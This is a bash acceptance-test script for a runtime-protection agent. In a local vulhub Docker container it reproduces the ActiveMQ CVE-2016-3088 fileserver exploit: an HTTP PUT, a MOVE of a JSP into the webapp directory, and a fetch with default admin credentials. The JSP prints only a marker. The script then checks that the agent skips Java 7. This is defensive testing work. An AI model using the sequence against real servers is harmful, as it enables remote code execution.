#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/../../.."

# shellcheck source=acceptance/lib/agent-build.sh
source acceptance/lib/agent-build.sh
host_agent_jar="$(ohmyrasp_agent_jar "$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar")"

ohmyrasp_build :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_ACTIVEMQ_3088_IMAGE:-vulhub/activemq:5.11.1-with-cron}"
baseline_name="${OHMYRASP_VULHUB_ACTIVEMQ_3088_BASELINE_NAME:-ohmyrasp-vulhub-activemq3088-baseline}"
protected_name="${OHMYRASP_VULHUB_ACTIVEMQ_3088_PROTECTED_NAME:-ohmyrasp-vulhub-activemq3088-protected}"
baseline_port="${OHMYRASP_VULHUB_ACTIVEMQ_3088_BASELINE_PORT:-19280}"
protected_port="${OHMYRASP_VULHUB_ACTIVEMQ_3088_PROTECTED_PORT:-19281}"
source_name="${OHMYRASP_VULHUB_ACTIVEMQ_3088_SOURCE_NAME:-ohmyrasp-3088.txt}"
jsp_name="${OHMYRASP_VULHUB_ACTIVEMQ_3088_JSP_NAME:-ohmyrasp-3088.jsp}"
jsp_path="/opt/activemq/webapps/api/${jsp_name}"
baseline_dir="logs/vulhub-activemq-3088-java7-baseline"
protected_dir="logs/vulhub-activemq-3088-java7-protected"
proof_text="ohmyrasp-3088-proof"

cleanup() {
  docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
  docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

wait_for_http() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status

  for attempt in $(seq 1 150); do
    status="$(curl -sS -o "${dir}/ready-${attempt}.response" -w "%{http_code}" \
      "http://127.0.0.1:${port}/" 2>/dev/null || true)"
    if [[ "$status" != "000" ]]; then
      printf 'http_ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
      return
    fi
    sleep 1
  done

  docker logs "$name" >&2 || true
  echo "${name} did not expose ActiveMQ web console at ${port}" >&2
  exit 1
}

put_and_move_jsp() {
  local port="$1"
  local dir="$2"
  local put_status
  local move_status
  local get_status

  printf '<%% out.print("%s"); %%>' "$proof_text" > "${dir}/payload.jsp"

  put_status="$(
    curl -sS -o "${dir}/put.response" -w "%{http_code}" \
      -X PUT --data-binary "@${dir}/payload.jsp" \
      "http://127.0.0.1:${port}/fileserver/${source_name}" || true
  )"
  printf 'put_status=%s\n' "$put_status" >> "${dir}/attempts.log"

  move_status="$(
    curl -sS -o "${dir}/move.response" -w "%{http_code}" \
      -X MOVE -H "Destination: file://${jsp_path}" \
      "http://127.0.0.1:${port}/fileserver/${source_name}" || true
  )"
  printf 'move_status=%s\n' "$move_status" >> "${dir}/attempts.log"

  get_status="$(
    curl -sS -u admin:admin -o "${dir}/jsp.response" -w "%{http_code}" \
      "http://127.0.0.1:${port}/api/${jsp_name}" || true
  )"
  printf 'jsp_status=%s\n' "$get_status" >> "${dir}/attempts.log"
}

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

docker image inspect "$image" >/dev/null 2>&1 || docker pull "$image" >/dev/null
docker image inspect "$image" --format '{{json .Config.Env}}' > "${baseline_dir}/image-env.json"
docker run --rm --entrypoint sh "$image" -lc 'java -version' \
  > "${baseline_dir}/java-version.log" 2>&1

docker run -d --name "$baseline_name" \
  -p "${baseline_port}:8161" \
  "$image" >/dev/null

wait_for_http "$baseline_name" "$baseline_port" "$baseline_dir"
docker exec "$baseline_name" rm -f "$jsp_path" || true
put_and_move_jsp "$baseline_port" "$baseline_dir"

if ! docker exec "$baseline_name" test -e "$jsp_path"; then
  sed -n '1,180p' "${baseline_dir}/put.response" >&2 || true
  sed -n '1,180p' "${baseline_dir}/move.response" >&2 || true
  docker logs "$baseline_name" >&2 || true
  echo "baseline ActiveMQ CVE-2016-3088 did not create ${jsp_path}" >&2
  exit 1
fi
if ! grep -Fq "$proof_text" "${baseline_dir}/jsp.response"; then
  sed -n '1,180p' "${baseline_dir}/jsp.response" >&2 || true
  echo "baseline ActiveMQ CVE-2016-3088 JSP did not render ${proof_text}" >&2
  exit 1
fi
printf 'baseline_jsp_marker=present\n' >> "${baseline_dir}/attempts.log"

docker run -d --name "$protected_name" \
  -p "${protected_port}:8161" \
  -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
  -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
  -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
  "$image" >/dev/null

# The agent cannot protect Java 7. Its entry class (class-file version 49) loads, finds that the Java 8
# launcher cannot, prints one skip line and returns, so the application starts unprotected.
wait_for_http "$protected_name" "$protected_port" "$protected_dir"
docker logs "$protected_name" > "${protected_dir}/container.log" 2>&1 || true
if ! grep -Fq '{"event":"ohmyrasp-agent-skipped","reason":"unsupported-java","java_version":"1.7","entry":"io.ohmyrasp.agent.launch.Java8Entry"' "${protected_dir}/container.log"; then
  sed -n '1,180p' "${protected_dir}/container.log" >&2 || true
  echo "ActiveMQ CVE-2016-3088 Java 7 container did not print the agent's unsupported-java skip line" >&2
  exit 1
fi
if ! docker ps --filter "name=${protected_name}" --filter "status=running" --format '{{.Names}}' | grep -q .; then
  sed -n '1,180p' "${protected_dir}/container.log" >&2
  echo "ActiveMQ CVE-2016-3088 Java 7 container stopped with the Java 8 agent attached" >&2
  exit 1
fi

echo "vulhub ActiveMQ CVE-2016-3088 Java7 legacy boundary passed"
